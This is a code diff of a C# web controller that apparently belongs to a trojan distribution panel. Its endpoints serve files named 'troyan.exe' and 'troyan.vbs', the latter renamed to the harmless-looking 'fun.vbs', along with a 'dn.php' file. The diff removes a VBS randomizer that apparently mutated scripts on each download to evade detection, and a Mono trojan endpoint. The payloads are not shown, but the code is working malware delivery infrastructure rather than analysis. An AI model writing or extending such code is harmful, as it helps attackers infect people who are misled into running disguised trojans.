@@ -75,27 +75,19 @@ public class CpController : BaseController
     {
         return GetFile(_serverService.GetExe(Server), "troyan.exe");
     }
-    
-    [HttpGet("/GetExeMono")]
-    public IActionResult GetExeMono()
-    {
-        return GetFile(_serverService.GetExeMono(Server), "troyan_mono.exe");
-    }
-    
-    private async Task<IActionResult> GetFileAdvanced(string file, string name, string random, string target, string randomMethod, string nofile)
+
+    private async Task<IActionResult> GetFileAdvanced(string file, string name, string random, string target, string nofile)
     {
         try
         {
             string fileContent;
             if (!_memoryCache.TryGetValue(file, out fileContent))
             {
-                fileContent = await VbsRandomer.ReadFileWithRetryAsync($@"C:\data\{Server}\{file}", 2, 50);
+                fileContent = await System.IO.File.ReadAllTextAsync(ServerModelLoader.UserDataFile(Server,file));
                 var cacheEntryOptions = new MemoryCacheEntryOptions()
                     .SetSlidingExpiration(TimeSpan.FromMinutes(1));
                 _memoryCache.Set(file, fileContent, cacheEntryOptions);
             }
-            if (randomMethod == "vbs")
-                fileContent = VbsRandomer.Modify(fileContent);
             var fileBytes = Encoding.UTF8.GetBytes(fileContent);
             Response.Headers.Add("Content-Type", "text/plain");
             if (nofile == "nofile")
@@ -117,13 +109,13 @@ public class CpController : BaseController
         if (string.IsNullOrWhiteSpace(Server))
             return BadRequest("Server address not found.");
         
-        return await GetFileAdvanced("troyan.c.vbs", "fun.vbs", random, target, "vbs", "");
+        return await GetFileAdvanced("troyan.vbs", "fun.vbs", random, target, "");
     }
         
     [HttpGet("/{profile}/GetVbsPhp")]
     public async Task<IActionResult> GetVbsPhp(string profile)
     {
-        return await GetFileAdvanced("dn.php", "dn.php", "", "", "","nofile");
+        return await GetFileAdvanced("dn.php", "dn.php", "", "","nofile");
     }
     
     [HttpPost]
